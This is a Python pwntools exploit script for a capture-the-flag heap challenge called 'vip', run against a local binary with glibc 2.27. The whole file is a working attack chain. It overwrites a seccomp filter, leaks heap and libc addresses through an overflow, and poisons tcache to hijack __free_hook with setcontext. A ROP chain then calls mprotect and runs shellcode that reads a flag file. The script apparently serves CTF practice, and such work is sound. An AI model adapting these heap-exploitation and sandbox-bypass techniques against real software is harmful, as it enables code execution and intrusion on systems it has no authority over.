#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF("./vip_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed="unsigned")
uu64 = lambda data : u64(data.encode(ENCODING), signed="unsigned")
iu32 = lambda data : u32(data.encode(ENCODING), signed="signed")
iu64 = lambda data : u64(data.encode(ENCODING), signed="signed")
up32 = lambda data : p32(data, signed="unsigned").decode(ENCODING)
up64 = lambda data : p64(data, signed="unsigned").decode(ENCODING)
ip32 = lambda data : p32(data, signed="signed").decode(ENCODING)
ip64 = lambda data : p64(data, signed="signed").decode(ENCODING)

local = 1
if local:
    p = process([elf.path])
else:
    p = remote('localhost', 8888)

def alloc(idx):
    sa('Your choice: ', '1')
    sa('Index: ', str(idx))

def show(idx):
    sa('Your choice: ', '2')
    sa('Index: ', str(idx))

def delete(idx):
    sa('Your choice: ', '3')
    sa('Index: ', str(idx))

def edit(idx, sz, buf):
    sa('Your choice: ', '4')
    sa('Index: ', str(idx))
    sla('Size: ', str(sz))
    sa('Content: ', buf)

def vip(buf):
    sa('Your choice: ', '6')
    sa('please tell us your name: \n', buf)

# heap allocation
for i in range(13):
    alloc(i)

# new sandbox (0x30)
bpf = [32,0,0,0,0,0,0,0,21,0,7,0,2,0,0,0,21,0,6,0,10,0,0,0,21,0,5,0,1,0,0,0,21,0,4,0,0,0,0,0,6,0,0,0,0,0,5,0,21,0,2,0,2,0,0,0,21,0,1,0,60,0,0,0,6,0,0,0,5,0,5,0,6,0,0,0,0,0,255,127,6,0,0,0,0,0,0,0]
#gdb.attach(p, 'b *0x0000000000401389\nc')
vip('A' * 0x20 + ''.join(chr(c) for c in bpf[:0x30]))

# leak heap
delete(2)
delete(1)
edit(0, 0x60, 'A' * 0x58 + '12345678')
show(0)
ru('12345678')
heap_base = uu64(ru('\n')[:-1].ljust(8, '\x00')) - 0x320
info('heap_base = ' + hex(heap_base))

# leak libc
edit(0, 0x60, 'A' * 0x58 + up64(0x61))
alloc(1)
alloc(2)
#gdb.attach(p, 'b *0x00000000004014EB\nc')
edit(0, 0x60, 'A' * 0x58 + up64(0x421))
delete(1) # put into unsortedbin
edit(0, 0x60, 'A' * 0x58 + '12345678')
show(0)
ru('12345678')
libc_base = uu64(r(6).ljust(8, '\x00')) - 0x1ecbe0 - 0x1ff0c0
info('libc_base = ' + hex(libc_base))

setcontext = libc_base + libc.sym['setcontext']
free_hook = libc_base + libc.sym['__free_hook']
# http://blog.eonew.cn/2019-09-12.Byte%20CTF%202019%20%E9%83%A8%E5%88%86%20writeup.html#VIP
system = libc_base + libc.sym['system']
mprotect = libc_base + libc.sym['mprotect']

# tcache attack
edit(0, 0x60, 'A' * 0x58 + up64(0x61))
alloc(1)
delete(1)
edit(0, 0x68, 'A' * 0x58 + up64(0x121) + up64(free_hook))
alloc(13)
alloc(14) # get free_hook
edit(14, 8, up64(setcontext + 0x35))

ret = libc_base + 0x00000000000008aa
pop_rdi_ret = libc_base + 0x00000000000215bf
pop_rsi_ret = libc_base + 0x0000000000023eea
pop_rdx_ret = libc_base + 0x0000000000001b96

# get shell
sh = shellcode = shellcraft.amd64.pushstr('flag').rstrip() + \
    shellcraft.amd64.linux.syscall('SYS_open', "rsp", 0).rstrip() + \
    shellcraft.amd64.linux.syscall('SYS_read', "rax", free_hook, 0x40).rstrip() + \
    shellcraft.amd64.linux.syscall('SYS_write', 1, free_hook, 0x40).rstrip()
info('len(asm(sh)) = ' + str(len(asm(sh))))
sa('Your choice: ', '4')
sa('Index: ', '0')
sla('Size: ', str(0x100))
p.sendlineafter(b'Content: ', asm(sh))
rop = (
    up64(pop_rdi_ret) + up64(heap_base) + 
    up64(pop_rsi_ret) + up64(0x1000) + 
    up64(pop_rdx_ret) + up64(7) + 
    up64(mprotect) + 
    up64(heap_base + 0x260)
)
edit(13, 0xb0, rop.ljust(0xa0, '\x00') + up64(heap_base + 0x2c0) + up64(ret))
gdb.attach(p, 'b *setcontext+0x35\nc')
delete(13)

#gdb.attach(p)

p.interactive()

